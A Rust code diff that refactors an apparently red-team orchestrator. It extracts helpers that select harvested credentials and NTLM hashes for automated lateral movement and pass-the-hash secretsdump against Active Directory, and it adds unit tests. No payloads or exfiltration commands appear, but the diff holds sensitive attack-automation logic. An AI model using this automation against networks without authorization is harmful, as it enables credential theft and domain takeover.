@@ -18,6 +18,228 @@ use crate::orchestrator::state::*;
 /// Lateral movement techniques to try, in order of stealth preference.
 const LATERAL_TECHNIQUES: &[&str] = &["smbexec", "wmiexec", "psexec"];
 
+/// Resolve a credential's `domain` field to an FQDN for downstream
+/// comparisons. NetBIOS labels (e.g. `CHILD`) are looked up in
+/// `state.netbios_to_fqdn`; if no mapping exists, the lowercase raw
+/// value is returned unchanged.
+pub(crate) fn resolve_cred_domain(state: &StateInner, raw_domain: &str) -> String {
+    let raw = raw_domain.to_lowercase();
+    if raw.contains('.') {
+        return raw;
+    }
+    state
+        .netbios_to_fqdn
+        .get(&raw)
+        .or_else(|| state.netbios_to_fqdn.get(&raw_domain.to_uppercase()))
+        .map(|fqdn| fqdn.to_lowercase())
+        .unwrap_or(raw)
+}
+
+/// Resolve a host's domain. Prefer the FQDN suffix of `hostname`; fall back
+/// to scanning `state.domain_controllers` for a DC IP match when the host
+/// has only a bare IP. Returns `""` when no resolution is possible.
+pub(crate) fn resolve_host_domain(state: &StateInner, host: &ares_core::models::Host) -> String {
+    let from_hostname = host
+        .hostname
+        .to_lowercase()
+        .split_once('.')
+        .map(|x| x.1)
+        .unwrap_or("")
+        .to_string();
+    if !from_hostname.is_empty() {
+        return from_hostname;
+    }
+    state
+        .domain_controllers
+        .iter()
+        .find(|(_, ip)| ip.as_str() == host.ip)
+        .map(|(d, _)| d.to_lowercase())
+        .unwrap_or_default()
+}
+
+/// True when `host_domain` is in the same forest as `cred_domain` —
+/// equal, child, or parent. Empty `host_domain` returns false (we don't
+/// know the host's domain, so we skip rather than risk cross-domain auth).
+pub(crate) fn domain_is_same_or_relative(host_domain: &str, cred_domain: &str) -> bool {
+    !host_domain.is_empty()
+        && (host_domain == cred_domain
+            || host_domain.ends_with(&format!(".{cred_domain}"))
+            || cred_domain.ends_with(&format!(".{host_domain}")))
+}
+
+/// Collect every non-owned host IP whose resolved domain is in the same
+/// forest as `cred_domain`.
+pub(crate) fn find_lateral_targets_for_cred_domain(
+    state: &StateInner,
+    cred_domain: &str,
+) -> Vec<String> {
+    state
+        .hosts
+        .iter()
+        .filter(|h| !h.owned)
+        .filter(|h| {
+            let host_domain = resolve_host_domain(state, h);
+            domain_is_same_or_relative(&host_domain, cred_domain)
+        })
+        .map(|h| h.ip.clone())
+        .collect()
+}
+
+/// Collect every DC IP whose domain is in the same forest as `cred_domain`.
+/// Parent creds are valid for child-domain DCs, so child entries are included.
+pub(crate) fn find_dc_ips_for_cred_domain(state: &StateInner, cred_domain: &str) -> Vec<String> {
+    state
+        .domain_controllers
+        .iter()
+        .filter(|(domain, _)| {
+            let d = domain.to_lowercase();
+            d == cred_domain || d.ends_with(&format!(".{cred_domain}"))
+        })
+        .map(|(_, ip)| ip.clone())
+        .collect()
+}
+
+/// Build the dedup key for a credential-expansion work item.
+pub(crate) fn credential_expansion_dedup_key(cred: &ares_core::models::Credential) -> String {
+    format!(
+        "{}:{}",
+        cred.domain.to_lowercase(),
+        cred.username.to_lowercase()
+    )
+}
+
+/// Snapshot the next batch of credential-expansion work items.
+///
+/// Filters `state.credentials` for non-admin non-delegation accounts (or
+/// any admin), with non-quarantined principals and at least one viable
+/// lateral target in the same forest, capping at `max_items`.
+///
+/// Extracted from the inline closure so the credential-filter + target-
+/// resolution rules can be tested against a constructed `StateInner`.
+pub(crate) fn select_credential_expansion_work(
+    state: &StateInner,
+    max_items: usize,
+) -> Vec<ExpansionWork> {
+    state
+        .credentials
+        .iter()
+        .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
+        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
+        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
+        .filter_map(|cred| {
+            let dedup = credential_expansion_dedup_key(cred);
+            if state.is_processed(DEDUP_EXPANSION_CREDS, &dedup) {
+                return None;
+            }
+            let cred_domain = resolve_cred_domain(state, &cred.domain);
+            let targets = find_lateral_targets_for_cred_domain(state, &cred_domain);
+            if targets.is_empty() {
+                return None;
+            }
+            let dc_ips = find_dc_ips_for_cred_domain(state, &cred_domain);
+            Some(ExpansionWork {
+                dedup_key: dedup,
+                credential: cred.clone(),
+                targets,
+                dc_ips,
+                is_admin: cred.is_admin,
+            })
+        })
+        .take(max_items)
+        .collect()
+}
+
+/// Build the dedup key for a pass-the-hash expansion work item.
+///
+/// The hash's first 32 hex characters (truncated if shorter) are folded in
+/// to disambiguate rotations of the same principal — different NTLM hash =
+/// different attempt.
+pub(crate) fn hash_expansion_dedup_key(hash: &ares_core::models::Hash) -> String {
+    format!(
+        "{}:{}:{}",
+        hash.domain.to_lowercase(),
+        hash.username.to_lowercase(),
+        &hash.hash_value[..32.min(hash.hash_value.len())]
+    )
+}
+
+/// Build a `Credential` for pass-the-hash dispatch from an NTLM hash. The
+/// hash value goes into the `password` slot, matching the convention
+/// downstream `request_lateral` / `request_secretsdump` consume.
+pub(crate) fn build_pth_credential(
+    hash: &ares_core::models::Hash,
+) -> ares_core::models::Credential {
+    ares_core::models::Credential {
+        id: format!("pth_{}", hash.username),
+        username: hash.username.clone(),
+        password: hash.hash_value.clone(),
+        domain: hash.domain.clone(),
+        source: "hash_pth".to_string(),
+        discovered_at: None,
+        is_admin: false,
+        parent_id: None,
+        attack_step: 0,
+    }
+}
+
+/// Snapshot the next batch of hash-expansion work items.
+///
+/// Filters `state.hashes` for non-`krbtgt`, non-machine NTLM hashes, with
+/// at least one non-owned target host, capping at `max_items`.
+pub(crate) fn select_hash_expansion_work(
+    state: &StateInner,
+    max_items: usize,
+) -> Vec<HashExpansionWork> {
+    state
+        .hashes
+        .iter()
+        .filter(|h| {
+            h.hash_type.to_lowercase() == "ntlm"
+                && !h.domain.is_empty()
+                && h.username.to_lowercase() != "krbtgt"
+                && !h.username.ends_with('$')
+        })
+        .filter_map(|hash| {
+            let dedup = hash_expansion_dedup_key(hash);
+            if state.is_processed(DEDUP_HASH_LATERAL, &dedup) {
+                return None;
+            }
+            let targets: Vec<String> = state
+                .hosts
+                .iter()
+                .filter(|h| !h.owned)
+                .map(|h| h.ip.clone())
+                .collect();
+            if targets.is_empty() {
+                return None;
+            }
+            Some(HashExpansionWork {
+                dedup_key: dedup,
+                hash: hash.clone(),
+                targets,
+            })
+        })
+        .take(max_items)
+        .collect()
+}
+
+/// Collect DCs in the same forest as `hash_domain` for pass-the-hash
+/// secretsdump. Cross-forest PTH secretsdump fails at DRSUAPI; this gate
+/// keeps the dispatch budget from being wasted on doomed cross-forest
+/// attempts.
+pub(crate) fn find_pth_dc_ips_for_hash(state: &StateInner, hash_domain: &str) -> Vec<String> {
+    let hash_domain = hash_domain.to_lowercase();
+    state
+        .all_domains_with_dcs()
+        .into_iter()
+        .filter(|(domain, _)| {
+            let d = domain.to_lowercase();
+            d == hash_domain || d.ends_with(&format!(".{hash_domain}"))
+        })
+        .map(|(_, ip)| ip)
+        .collect()
+}
+
 /// Monitors for new credentials and dispatches lateral movement + secretsdump.
 /// Interval: 15s. Enhanced version of the original auto_credential_expansion.
 pub async fn auto_credential_expansion(
@@ -45,108 +267,7 @@ pub async fn auto_credential_expansion(
                 continue;
             }
 
-            state
-                .credentials
-                .iter()
-                .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
-                // Skip delegation accounts — their auth is reserved for S4U.
-                .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
-                // Skip quarantined credentials — locked out, retry after expiry.
-                .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
-                .filter_map(|cred| {
-                    let dedup = format!(
-                        "{}:{}",
-                        cred.domain.to_lowercase(),
-                        cred.username.to_lowercase()
-                    );
-                    if state.is_processed(DEDUP_EXPANSION_CREDS, &dedup) {
-                        return None;
-                    }
-
-                    // Collect non-owned host IPs in the same domain (or child
-                    // domains). Cross-domain lateral attempts with wrong-domain
-                    // creds generate failed auth that triggers AD lockout.
-                    // Domain is extracted from hostname (e.g.,
-                    // dc02.child.contoso.local → child.contoso.local).
-                    // Resolve NetBIOS domain names (e.g. "CHILD") to FQDN
-                    // via the netbios_to_fqdn map before matching.
-                    let cred_dom = {
-                        let raw = cred.domain.to_lowercase();
-                        if !raw.contains('.') {
-                            state
-                                .netbios_to_fqdn
-                                .get(&raw)
-                                .or_else(|| state.netbios_to_fqdn.get(&cred.domain.to_uppercase()))
-                                .map(|fqdn| fqdn.to_lowercase())
-                                .unwrap_or(raw)
-                        } else {
-                            raw
-                        }
-                    };
-                    let targets: Vec<String> = state
-                        .hosts
-                        .iter()
-                        .filter(|h| !h.owned)
-                        .filter(|h| {
-                            // Resolve host domain: prefer hostname FQDN, fall
-                            // back to domain_controllers map for bare-IP hosts.
-                            let host_domain = {
-                                let from_hostname = h
-                                    .hostname
-                                    .to_lowercase()
-                                    .split_once('.')
-                                    .map(|x| x.1)
-                                    .unwrap_or("")
-                                    .to_string();
-                                if from_hostname.is_empty() {
-                                    state
-                                        .domain_controllers
-                                        .iter()
-                                        .find(|(_, ip)| ip.as_str() == h.ip)
-                                        .map(|(d, _)| d.to_lowercase())
-                                        .unwrap_or_default()
-                                } else {
-                                    from_hostname
-                                }
-                            };
-                            // Skip unknown-domain hosts — retry next cycle
-                            // after nmap populates hostnames.
-                            !host_domain.is_empty()
-                                && (host_domain == cred_dom
-                                    || host_domain.ends_with(&format!(".{cred_dom}"))
-                                    || cred_dom.ends_with(&format!(".{host_domain}")))
-                        })
-                        .map(|h| h.ip.clone())
-                        .collect();
-
-                    if targets.is_empty() {
-                        return None;
-                    }
-
-                    // Find DCs for this credential's domain (for secretsdump).
-                    // Also include child-domain DCs — parent creds are valid in child domains.
-                    // Reuse resolved cred_dom (already NetBIOS→FQDN resolved).
-                    let cred_domain = cred_dom.clone();
-                    let dc_ips: Vec<String> = state
-                        .domain_controllers
-                        .iter()
-                        .filter(|(domain, _)| {
-                            let d = domain.to_lowercase();
-                            d == cred_domain || d.ends_with(&format!(".{cred_domain}"))
-                        })
-                        .map(|(_, ip)| ip.clone())
-                        .collect();
-
-                    Some(ExpansionWork {
-                        dedup_key: dedup,
-                        credential: cred.clone(),
-                        targets,
-                        dc_ips,
-                        is_admin: cred.is_admin,
-                    })
-                })
-                .take(3) // Process max 3 new creds per cycle
-                .collect()
+            select_credential_expansion_work(&state, 3)
         };
 
         for item in work {
@@ -245,62 +366,14 @@ pub async fn auto_credential_expansion(
                 continue;
             }
 
-            state
-                .hashes
-                .iter()
-                .filter(|h| {
-                    h.hash_type.to_lowercase() == "ntlm"
-                        && !h.domain.is_empty()
-                        && h.username.to_lowercase() != "krbtgt"
-                        && !h.username.ends_with('$')
-                })
-                .filter_map(|hash| {
-                    let dedup = format!(
-                        "{}:{}:{}",
-                        hash.domain.to_lowercase(),
-                        hash.username.to_lowercase(),
-                        &hash.hash_value[..32.min(hash.hash_value.len())]
-                    );
-                    if state.is_processed(DEDUP_HASH_LATERAL, &dedup) {
-                        return None;
-                    }
-
-                    let targets: Vec<String> = state
-                        .hosts
-                        .iter()
-                        .filter(|h| !h.owned)
-                        .map(|h| h.ip.clone())
-                        .collect();
-
-                    if targets.is_empty() {
-                        return None;
-                    }
-
-                    Some(HashExpansionWork {
-                        dedup_key: dedup,
-                        hash: hash.clone(),
-                        targets,
-                    })
-                })
-                .take(2)
-                .collect()
+            select_hash_expansion_work(&state, 2)
         };
 
         for item in hash_work {
             let mut dc_sd_dispatched = false;
 
             // Build a credential-like object for pass-the-hash
-            let pth_cred = ares_core::models::Credential {
-                id: format!("pth_{}", item.hash.username),
-                username: item.hash.username.clone(),
-                password: item.hash.hash_value.clone(),
-                domain: item.hash.domain.clone(),
-                source: "hash_pth".to_string(),
-                discovered_at: None,
-                is_admin: false,
-                parent_id: None,
-                attack_step: 0,
-            };
+            let pth_cred = build_pth_credential(&item.hash);
 
             for target_ip in item.targets.iter().take(3) {
                 if let Ok(Some(task_id)) = dispatcher
@@ -327,18 +400,10 @@ pub async fn auto_credential_expansion(
             // path was missing the gate, dispatching foreign-forest creds
             // against unrelated DCs.
             {
-                let state = dispatcher.state.read().await;
-                let hash_domain = item.hash.domain.to_lowercase();
-                let dc_ips: Vec<String> = state
-                    .all_domains_with_dcs()
-                    .into_iter()
-                    .filter(|(domain, _)| {
-                        let d = domain.to_lowercase();
-                        d == hash_domain || d.ends_with(&format!(".{hash_domain}"))
-                    })
-                    .map(|(_, ip)| ip)
-                    .collect();
-                drop(state);
+                let dc_ips: Vec<String> = {
+                    let state = dispatcher.state.read().await;
+                    find_pth_dc_ips_for_hash(&state, &item.hash.domain)
+                };
 
                 if !dispatcher.is_technique_allowed("secretsdump") {
                     // Strategy excludes secretsdump — skip hash-based expansion too.
@@ -512,18 +577,18 @@ async fn requeue_mssql_vuln(
     Ok(())
 }
 
-struct ExpansionWork {
-    dedup_key: String,
-    credential: ares_core::models::Credential,
-    targets: Vec<String>,
-    dc_ips: Vec<String>,
-    is_admin: bool,
+pub(crate) struct ExpansionWork {
+    pub dedup_key: String,
+    pub credential: ares_core::models::Credential,
+    pub targets: Vec<String>,
+    pub dc_ips: Vec<String>,
+    pub is_admin: bool,
 }
 
-struct HashExpansionWork {
-    dedup_key: String,
-    hash: ares_core::models::Hash,
-    targets: Vec<String>,
+pub(crate) struct HashExpansionWork {
+    pub dedup_key: String,
+    pub hash: ares_core::models::Hash,
+    pub targets: Vec<String>,
 }
 
 #[cfg(test)]
@@ -667,7 +732,7 @@ mod tests {
     }
 
     #[test]
-    fn hash_expansion_dedup_key() {
+    fn hash_expansion_dedup_key_format() {
         // Test the dedup key format for hash-based expansion
         let domain = "contoso.local";
         let username = "Administrator";
@@ -959,5 +1024,479 @@ mod tests {
             .unwrap_or("")
             .to_string();
         assert_eq!(from_hostname2, "");
+    }
+
+    // ── tests for extracted pure helpers ──────────────────────────────
+
+    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
+        ares_core::models::Credential {
+            id: format!("c-{user}-{domain}"),
+            username: user.to_string(),
+            password: password.to_string(),
+            domain: domain.to_string(),
+            source: String::new(),
+            discovered_at: None,
+            is_admin: false,
+            parent_id: None,
+            attack_step: 0,
+        }
+    }
+
+    fn make_admin_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
+        let mut c = make_cred(user, password, domain);
+        c.is_admin = true;
+        c
+    }
+
+    fn make_host(hostname: &str, ip: &str) -> ares_core::models::Host {
+        ares_core::models::Host {
+            ip: ip.to_string(),
+            hostname: hostname.to_string(),
+            os: String::new(),
+            roles: Vec::new(),
+            services: Vec::new(),
+            is_dc: false,
+            owned: false,
+        }
+    }
+
+    fn make_ntlm_hash(user: &str, value: &str, domain: &str) -> ares_core::models::Hash {
+        ares_core::models::Hash {
+            id: format!("h-{user}-{domain}"),
+            username: user.to_string(),
+            hash_value: value.to_string(),
+            hash_type: "NTLM".to_string(),
+            domain: domain.to_string(),
+            cracked_password: None,
+            source: String::new(),
+            discovered_at: None,
+            parent_id: None,
+            attack_step: 0,
+            aes_key: None,
+            is_previous: false,
+            source_host: None,
+            is_trust_key: false,
+            trust_pair_label: None,
+        }
+    }
+
+    // --- resolve_cred_domain ---------------------------------------------
+
+    #[test]
+    fn resolve_cred_domain_passes_through_fqdn() {
+        let s = StateInner::new("op".into());
+        assert_eq!(resolve_cred_domain(&s, "Contoso.Local"), "contoso.local");
+    }
+
+    #[test]
+    fn resolve_cred_domain_uses_netbios_map_lowercase_key() {
+        let mut s = StateInner::new("op".into());
+        s.netbios_to_fqdn
+            .insert("child".into(), "child.contoso.local".into());
+        assert_eq!(resolve_cred_domain(&s, "CHILD"), "child.contoso.local");
+    }
+
+    #[test]
+    fn resolve_cred_domain_uses_netbios_map_uppercase_key_fallback() {
+        let mut s = StateInner::new("op".into());
+        s.netbios_to_fqdn
+            .insert("CHILD".into(), "child.contoso.local".into());
+        assert_eq!(resolve_cred_domain(&s, "CHILD"), "child.contoso.local");
+    }
+
+    #[test]
+    fn resolve_cred_domain_falls_back_to_lowercased_raw() {
+        let s = StateInner::new("op".into());
+        // No mapping, no dot → just lowercased.
+        assert_eq!(resolve_cred_domain(&s, "UNKNOWN"), "unknown");
+    }
+
+    // --- resolve_host_domain ---------------------------------------------
+
+    #[test]
+    fn resolve_host_domain_uses_hostname_fqdn() {
+        let s = StateInner::new("op".into());
+        let h = make_host("dc01.contoso.local", "192.168.58.10");
+        assert_eq!(resolve_host_domain(&s, &h), "contoso.local");
+    }
+
+    #[test]
+    fn resolve_host_domain_falls_back_to_dc_map_for_bare_hostname() {
+        let mut s = StateInner::new("op".into());
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        let h = make_host("dc01", "192.168.58.10");
+        assert_eq!(resolve_host_domain(&s, &h), "contoso.local");
+    }
+
+    #[test]
+    fn resolve_host_domain_empty_when_no_signal() {
+        let s = StateInner::new("op".into());
+        let h = make_host("dc01", "192.168.58.10");
+        assert!(resolve_host_domain(&s, &h).is_empty());
+    }
+
+    // --- domain_is_same_or_relative --------------------------------------
+
+    #[test]
+    fn same_or_relative_same_domain() {
+        assert!(domain_is_same_or_relative("contoso.local", "contoso.local"));
+    }
+
+    #[test]
+    fn same_or_relative_child_of_cred() {
+        assert!(domain_is_same_or_relative(
+            "child.contoso.local",
+            "contoso.local"
+        ));
+    }
+
+    #[test]
+    fn same_or_relative_parent_of_cred() {
+        assert!(domain_is_same_or_relative(
+            "contoso.local",
+            "child.contoso.local"
+        ));
+    }
+
+    #[test]
+    fn same_or_relative_cross_forest_false() {
+        assert!(!domain_is_same_or_relative(
+            "fabrikam.local",
+            "contoso.local"
+        ));
+    }
+
+    #[test]
+    fn same_or_relative_empty_host_returns_false() {
+        assert!(!domain_is_same_or_relative("", "contoso.local"));
+    }
+
+    // --- find_lateral_targets_for_cred_domain ----------------------------
+
+    #[test]
+    fn find_targets_collects_same_domain_non_owned_hosts() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        s.hosts
+            .push(make_host("sql01.contoso.local", "192.168.58.20"));
+        s.hosts
+            .push(make_host("web01.fabrikam.local", "192.168.58.40"));
+        let mut targets = find_lateral_targets_for_cred_domain(&s, "contoso.local");
+        targets.sort();
+        assert_eq!(targets, vec!["192.168.58.10", "192.168.58.20"]);
+    }
+
+    #[test]
+    fn find_targets_excludes_owned_hosts() {
+        let mut s = StateInner::new("op".into());
+        let mut owned = make_host("dc01.contoso.local", "192.168.58.10");
+        owned.owned = true;
+        s.hosts.push(owned);
+        s.hosts
+            .push(make_host("sql01.contoso.local", "192.168.58.20"));
+        assert_eq!(
+            find_lateral_targets_for_cred_domain(&s, "contoso.local"),
+            vec!["192.168.58.20"]
+        );
+    }
+
+    #[test]
+    fn find_targets_includes_child_domain_hosts() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc02.child.contoso.local", "192.168.58.30"));
+        // Parent cred → child host: relative, included.
+        let targets = find_lateral_targets_for_cred_domain(&s, "contoso.local");
+        assert_eq!(targets, vec!["192.168.58.30"]);
+    }
+
+    #[test]
+    fn find_targets_skips_unknown_domain_hosts() {
+        let mut s = StateInner::new("op".into());
+        // Bare hostname with no DC-IP mapping → unknown domain → skipped.
+        s.hosts.push(make_host("mystery", "192.168.58.99"));
+        assert!(find_lateral_targets_for_cred_domain(&s, "contoso.local").is_empty());
+    }
+
+    // --- find_dc_ips_for_cred_domain --------------------------------------
+
+    #[test]
+    fn find_dc_ips_same_and_child_domain() {
+        let mut s = StateInner::new("op".into());
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.40".into());
+        let mut ips = find_dc_ips_for_cred_domain(&s, "contoso.local");
+        ips.sort();
+        assert_eq!(ips, vec!["192.168.58.10", "192.168.58.11"]);
+    }
+
+    #[test]
+    fn find_dc_ips_excludes_parent_when_cred_is_child() {
+        // Parent forest membership is not asymmetric — child cred shouldn't
+        // try parent DC via this filter (parent cred → child DC is fine via
+        // the suffix rule, but child cred → parent DC is rejected here).
+        let mut s = StateInner::new("op".into());
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        let ips = find_dc_ips_for_cred_domain(&s, "child.contoso.local");
+        assert_eq!(ips, vec!["192.168.58.11"]);
+    }
+
+    // --- select_credential_expansion_work --------------------------------
+
+    #[test]
+    fn select_creds_skips_empty_password() {
+        let mut s = StateInner::new("op".into());
+        s.credentials.push(make_cred("alice", "", "contoso.local"));
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        assert!(select_credential_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_creds_skips_empty_domain() {
+        let mut s = StateInner::new("op".into());
+        s.credentials.push(make_cred("alice", "P@ss", ""));
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        assert!(select_credential_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_creds_skips_already_processed() {
+        let mut s = StateInner::new("op".into());
+        s.credentials
+            .push(make_cred("alice", "P@ss", "contoso.local"));
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        s.mark_processed(DEDUP_EXPANSION_CREDS, "contoso.local:alice".into());
+        assert!(select_credential_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_creds_skips_when_no_targets() {
+        let mut s = StateInner::new("op".into());
+        s.credentials
+            .push(make_cred("alice", "P@ss", "contoso.local"));
+        // No hosts → no targets → skip.
+        assert!(select_credential_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_creds_skips_quarantined_principal() {
+        let mut s = StateInner::new("op".into());
+        s.credentials
+            .push(make_cred("alice", "P@ss", "contoso.local"));
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        s.quarantine_principal("alice", "contoso.local");
+        assert!(select_credential_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_creds_picks_eligible_credential() {
+        let mut s = StateInner::new("op".into());
+        s.credentials
+            .push(make_cred("alice", "P@ss", "contoso.local"));
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        let work = select_credential_expansion_work(&s, 10);
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].credential.username, "alice");
+        assert_eq!(work[0].targets, vec!["192.168.58.10"]);
+        assert_eq!(work[0].dc_ips, vec!["192.168.58.10"]);
+        assert!(!work[0].is_admin);
+    }
+
+    #[test]
+    fn select_creds_caps_at_max_items() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        for u in &["alice", "bob", "carol", "dave"] {
+            s.credentials.push(make_cred(u, "P@ss", "contoso.local"));
+        }
+        assert_eq!(select_credential_expansion_work(&s, 2).len(), 2);
+        assert_eq!(select_credential_expansion_work(&s, 3).len(), 3);
+    }
+
+    #[test]
+    fn select_creds_admin_overrides_delegation_account_filter() {
+        // Non-admin delegation account is skipped — admin delegation account
+        // is kept (admin needs to expand regardless of S4U reservation).
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        // Pre-seed a vuln so `is_delegation_account` returns true.
+        let mut details = std::collections::HashMap::new();
+        details.insert("account_name".into(), serde_json::json!("svc_sql"));
+        let v = ares_core::models::VulnerabilityInfo {
+            vuln_id: "v1".into(),
+            vuln_type: "constrained_delegation".into(),
+            target: "192.168.58.10".into(),
+            discovered_by: "test".into(),
+            discovered_at: chrono::Utc::now(),
+            details,
+            recommended_agent: String::new(),
+            priority: 1,
+        };
+        s.discovered_vulnerabilities.insert("v1".into(), v);
+        assert!(s.is_delegation_account("svc_sql"));
+
+        s.credentials
+            .push(make_cred("svc_sql", "P@ss", "contoso.local"));
+        // Non-admin delegation → filtered out.
+        assert!(select_credential_expansion_work(&s, 10).is_empty());
+
+        // Admin flag overrides.
+        s.credentials.clear();
+        s.credentials
+            .push(make_admin_cred("svc_sql", "P@ss", "contoso.local"));
+        assert_eq!(select_credential_expansion_work(&s, 10).len(), 1);
+    }
+
+    // --- hash_expansion_dedup_key ---------------------------------------
+
+    #[test]
+    fn hash_dedup_key_lowercases_and_truncates() {
+        let h = make_ntlm_hash(
+            "Administrator",
+            "AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0",
+            "Contoso.Local",
+        );
+        let k = hash_expansion_dedup_key(&h);
+        assert_eq!(
+            k,
+            "contoso.local:administrator:AAD3B435B51404EEAAD3B435B51404EE"
+        );
+    }
+
+    #[test]
+    fn hash_dedup_key_short_hash_passed_through() {
+        let h = make_ntlm_hash("alice", "abc", "contoso.local");
+        assert_eq!(hash_expansion_dedup_key(&h), "contoso.local:alice:abc");
+    }
+
+    // --- build_pth_credential --------------------------------------------
+
+    #[test]
+    fn build_pth_cred_assigns_hash_to_password_slot() {
+        let h = make_ntlm_hash("alice", "deadbeef".repeat(4).as_str(), "contoso.local");
+        let c = build_pth_credential(&h);
+        assert_eq!(c.id, "pth_alice");
+        assert_eq!(c.username, "alice");
+        assert_eq!(c.password, h.hash_value);
+        assert_eq!(c.domain, "contoso.local");
+        assert_eq!(c.source, "hash_pth");
+        assert!(!c.is_admin);
+    }
+
+    // --- select_hash_expansion_work --------------------------------------
+
+    #[test]
+    fn select_hash_work_filters_non_ntlm() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        let mut h = make_ntlm_hash("alice", "aaaaaaaa", "contoso.local");
+        h.hash_type = "AES256".into();
+        s.hashes.push(h);
+        assert!(select_hash_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_hash_work_filters_krbtgt() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        s.hashes
+            .push(make_ntlm_hash("krbtgt", "aaaaaaaa", "contoso.local"));
+        assert!(select_hash_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_hash_work_filters_machine_accounts() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        s.hashes
+            .push(make_ntlm_hash("DC01$", "aaaaaaaa", "contoso.local"));
+        assert!(select_hash_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_hash_work_filters_already_processed() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        let h = make_ntlm_hash("alice", "aaaaaaaa", "contoso.local");
+        let key = hash_expansion_dedup_key(&h);
+        s.hashes.push(h);
+        s.mark_processed(DEDUP_HASH_LATERAL, key);
+        assert!(select_hash_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_hash_work_returns_eligible_hash() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        s.hashes
+            .push(make_ntlm_hash("alice", "aaaaaaaa", "contoso.local"));
+        let work = select_hash_expansion_work(&s, 10);
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].hash.username, "alice");
+        assert_eq!(work[0].targets, vec!["192.168.58.10"]);
+    }
+
+    #[test]
+    fn select_hash_work_excludes_owned_hosts() {
+        let mut s = StateInner::new("op".into());
+        let mut h = make_host("dc01.contoso.local", "192.168.58.10");
+        h.owned = true;
+        s.hosts.push(h);
+        s.hashes
+            .push(make_ntlm_hash("alice", "aaaaaaaa", "contoso.local"));
+        // No non-owned hosts → no work.
+        assert!(select_hash_expansion_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_hash_work_caps_at_max_items() {
+        let mut s = StateInner::new("op".into());
+        s.hosts
+            .push(make_host("dc01.contoso.local", "192.168.58.10"));
+        for (i, u) in ["alice", "bob", "carol"].iter().enumerate() {
+            let v = format!("{i:032}");
+            s.hashes.push(make_ntlm_hash(u, &v, "contoso.local"));
+        }
+        assert_eq!(select_hash_expansion_work(&s, 2).len(), 2);
+    }
+
+    // --- find_pth_dc_ips_for_hash ----------------------------------------
+
+    #[test]
+    fn pth_dc_ips_same_forest_only() {
+        let mut s = StateInner::new("op".into());
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.11".into());
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.40".into());
+        let mut ips = find_pth_dc_ips_for_hash(&s, "contoso.local");
+        ips.sort();
+        assert_eq!(ips, vec!["192.168.58.10", "192.168.58.11"]);
+        assert!(!ips.contains(&"192.168.58.40".to_string()));
     }
 }
